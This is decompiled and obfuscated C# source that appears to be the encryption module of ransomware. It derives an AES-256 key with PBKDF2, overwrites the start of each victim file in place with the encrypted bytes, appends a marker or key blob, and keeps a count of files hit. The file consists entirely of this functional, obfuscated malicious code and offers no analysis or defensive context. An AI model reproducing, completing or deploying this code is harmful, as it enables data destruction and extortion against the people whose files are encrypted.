using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace qYAjLWajCJpnf;

public static class YyTkJTBkSaQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] grhgCFxqniVe(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = WjZVEnsLQezbr(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes WjZVEnsLQezbr(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] jABPxSWkmiBG(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (bTJSgdVkQM.cdzmoqFlfITSP == getString_0(107396995))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (bTJSgdVkQM.JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(bTJSgdVkQM.vzSBJQFXpb, getString_0(107378854) + string_0 + getString_0(107457169) + ex.Message + getString_0(107397222));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool asKfRIcataD(string IWBmTKARrJCu, byte[] MRgSqllkMDRCm, byte[] CemBOcHEZGvXd = null)
	{
		try
		{
			byte[] array = null;
			if (bTJSgdVkQM.cdzmoqFlfITSP == getString_0(107396995))
			{
				array = (bTJSgdVkQM.CVCyEBDPJVibYms ? Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079))) : Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(IWBmTKARrJCu, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(MRgSqllkMDRCm, 0, MRgSqllkMDRCm.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(IWBmTKARrJCu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!bTJSgdVkQM.CVCyEBDPJVibYms)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(CemBOcHEZGvXd, 0, CemBOcHEZGvXd.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (bTJSgdVkQM.CVCyEBDPJVibYms ? Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079))) : Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088))));
				FileStream fileStream2 = new FileStream(IWBmTKARrJCu, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(MRgSqllkMDRCm, 0, MRgSqllkMDRCm.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(IWBmTKARrJCu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!bTJSgdVkQM.CVCyEBDPJVibYms)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(CemBOcHEZGvXd, 0, CemBOcHEZGvXd.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			bTJSgdVkQM.ytQePvltMhp++;
		}
		catch (Exception ex)
		{
			if (bTJSgdVkQM.JJYUPCZGaGN)
			{
				try
				{
					File.AppendAllText(bTJSgdVkQM.vzSBJQFXpb, getString_0(107378854) + IWBmTKARrJCu + getString_0(107457102) + ex.Message + getString_0(107397222));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (bTJSgdVkQM.CVCyEBDPJVibYms ? Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457079))) : Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(bTJSgdVkQM.MvmlvFwyfsdEjaTm) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088)) + Convert.ToString(bTJSgdVkQM.PnZVnKFyCNiuKv) + bTJSgdVkQM.gvCYkntYkqMW(getString_0(107457088))));
			FileStream fileStream4 = new FileStream(IWBmTKARrJCu, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(MRgSqllkMDRCm, 0, MRgSqllkMDRCm.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using (FileStream fileStream5 = new FileStream(IWBmTKARrJCu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				if (!bTJSgdVkQM.CVCyEBDPJVibYms)
				{
					fileStream5.Write(array2, 0, array2.Length);
				}
				else
				{
					fileStream5.Write(CemBOcHEZGvXd, 0, CemBOcHEZGvXd.Length);
					fileStream5.Write(array2, 0, array2.Length);
				}
			}
			return false;
		}
		return true;
	}

	static YyTkJTBkSaQ()
	{
		Strings.CreateGetStringDelegate(typeof(YyTkJTBkSaQ));
	}
}
